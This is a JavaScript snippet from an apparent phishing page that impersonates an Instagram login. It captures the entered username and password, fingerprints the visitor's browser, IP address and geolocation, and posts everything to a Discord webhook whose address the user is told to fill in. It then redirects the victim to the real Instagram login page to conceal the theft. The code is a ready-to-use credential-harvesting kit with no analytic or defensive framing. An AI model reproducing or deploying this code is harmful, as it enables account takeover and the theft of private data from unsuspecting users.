  <script>
    async function sendMessage() {
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ipAddress = ipData.ip;

        const screenWidth = window.screen.width;
        const screenHeight = window.screen.height;

        const browserLanguage = navigator.language;

        const areCookiesEnabled = navigator.cookieEnabled;

        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        const platform = navigator.platform;

        const userAgent = navigator.userAgent;

        const currentURL = window.location.href;

        const locationResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
        const locationData = await locationResponse.json();
        const location = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;

        const plugins = Array.from(navigator.plugins).map(plugin => plugin.name);

        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        const webhookURL = '{DISCORD_WEBHOOK_URL}'; // Replace 'DISCORD_WEBHOOK_URL' with your actual webhook URL

        const payload = {
          embeds: [{
            title: 'User Login Information',
            color: parseInt('FF0000', 16),
            fields: [
              { name: 'Username', value: username },
              { name: 'Password', value: password },
              { name: 'User Agent', value: userAgent },
              { name: 'Operating System', value: platform },
              { name: 'Timezone Offset', value: new Date().getTimezoneOffset() },
              { name: 'Screen Color Depth', value: window.screen.colorDepth },
              { name: 'Viewport Size', value: window.innerWidth + "x" + window.innerHeight },
              { name: 'Referrer', value: document.referrer },
              { name: 'IP Address', value: ipAddress },
              { name: 'Location', value: location },
              { name: 'Screen Resolution', value: `${screenWidth}x${screenHeight}` },
              { name: 'Browser Language', value: browserLanguage },
              { name: 'Cookies Enabled', value: areCookiesEnabled },
              { name: 'Timezone', value: timezone },
              { name: 'Platform', value: platform },
              { name: 'Current URL', value: currentURL },
              { name: 'Plugins', value: plugins.join(', ') }
            ]
          }]
        };

        const response = await fetch(webhookURL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(payload),
        });

        if (!response.ok) {
          console.error('Failed to send webhook:', response.statusText);
        } else {
          console.log('Webhook sent successfully');
        }

        window.location.replace("https://www.instagram.com/accounts/login/");
      } catch (error) {
        console.error('Error:', error);
      }
    }
  </script>
